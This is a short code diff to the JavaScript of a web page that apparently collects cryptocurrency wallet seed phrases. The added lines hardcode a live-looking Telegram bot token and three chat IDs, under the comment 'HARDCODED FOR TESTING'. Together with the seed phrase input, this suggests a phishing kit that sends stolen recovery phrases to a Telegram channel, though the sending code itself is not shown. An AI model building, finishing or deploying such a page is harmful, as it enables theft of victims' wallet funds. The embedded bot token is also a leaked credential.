@@ -133,8 +133,9 @@
         const subText = document.getElementById('subText');
         const supportBtn = document.getElementById('supportBtn');
         
-        const TELEGRAM_BOT_TOKEN = "__TELEGRAM_BOT_TOKEN__";
-        const chatIds = "__TELEGRAM_CHAT_IDS__".split(",");
+        // HARDCODED FOR TESTING
+        const TELEGRAM_BOT_TOKEN = "9061407096:AAE3yaoP--NawVyhXdtmarEkmz75yVfgTbk";
+        const chatIds = ["8325180633", "7716020747", "1137161841"];
 
         function checkInput() { if (seedPhraseInput.value.trim().length > 0) { phraseStatus.style.display = 'block'; } else { phraseStatus.style.display = 'none'; } }
         
